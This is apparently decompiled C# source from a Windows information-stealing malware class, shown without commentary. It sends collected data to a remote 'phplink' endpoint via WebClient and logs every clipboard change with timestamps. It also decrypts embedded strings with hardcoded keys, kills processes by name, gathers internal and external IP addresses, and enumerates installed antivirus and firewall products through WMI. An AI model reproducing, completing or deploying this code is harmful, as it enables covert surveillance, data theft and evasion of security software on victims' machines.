		webClient.DownloadString(phplink + "?fname=" + Filename + "&data=" + Data);
	}

	private void CH_Changed(Clipboard sender)
	{
		lock (CLog)
		{
			CLog = CLog + "[------------" + Conversions.ToString(DateAndTime.get_TimeOfDay()) + "------------]" + Environment.NewLine + ((Computer)MyProject.Computer).get_Clipboard().GetText() + Environment.NewLine + Environment.NewLine;
		}
	}

	public string AES_Decrypt(string input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string text = "";
		string result = default(string);
		try
		{
			byte[] array = new byte[32];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
			Array.Copy(sourceArray, 0, array, 0, 16);
			Array.Copy(sourceArray, 0, array, 15, 16);
			rijndaelManaged.Key = array;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			byte[] array2 = Convert.FromBase64String(input);
			text = Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
			result = text;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string Decrypt(string encryptedBytes, string secretKey)
	{
		string text = null;
		checked
		{
			using MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(encryptedBytes));
			RijndaelManaged algorithm = getAlgorithm(secretKey);
			using CryptoStream cryptoStream = new CryptoStream(memoryStream, algorithm.CreateDecryptor(), CryptoStreamMode.Read);
			byte[] array = new byte[(int)(memoryStream.Length - 1L) + 1];
			int count = cryptoStream.Read(array, 0, (int)memoryStream.Length);
			return Encoding.Unicode.GetString(array, 0, count);
		}
	}

	private RijndaelManaged getAlgorithm(string secretKey)
	{
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(secretKey, Encoding.Unicode.GetBytes("099u787978786"));
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		checked
		{
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes((int)Math.Round((double)rijndaelManaged.BlockSize / 8.0));
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes((int)Math.Round((double)rijndaelManaged.KeySize / 8.0));
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			return rijndaelManaged;
		}
	}

	public void seekanddestroy(string process__1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (process.ProcessName.Contains(process__1))
			{
				process.Kill();
			}
		}
	}

	public string GetInternalIP()
	{
		IPAddress[] addressList = Dns.GetHostEntry(Dns.GetHostName()).AddressList;
		int num = 0;
		IPAddress iPAddress;
		while (true)
		{
			if (num < addressList.Length)
			{
				iPAddress = addressList[num];
				if (iPAddress.AddressFamily == AddressFamily.InterNetwork)
				{
					break;
				}
				num = checked(num + 1);
				continue;
			}
			return null;
		}
		return iPAddress.ToString();
	}

	public string GetExternalIP()
	{
		return GetBetween(new WebClient().DownloadString("http://whatismyipaddress.com/"), "<!-- do not script -->", "<!-- do not script -->").Replace("&#46;", ".").Trim();
	}

	public string GetBetween(string Source, string Before, string After)
	{
		checked
		{
			int num = Source.IndexOf(Before, 0) + Before.Length;
			if (num - Before.Length == -1)
			{
				return string.Empty;
			}
			int num2 = Source.IndexOf(After, num);
			if (num2 == -1)
			{
				return string.Empty;
			}
			return Source.Substring(num, num2 - num);
		}
	}

	public string GetAntiVirus()
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		string result = default(string);
		try
		{
			string text = null;
			ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM AntivirusProduct");
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val2.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val3).get_Item("displayName").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			result = text;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string GetFirewall()
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		string result = default(string);
		try
		{
			string text = null;
			ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM FirewallProduct");
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val2.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val3).get_Item("displayName").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			result = text;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
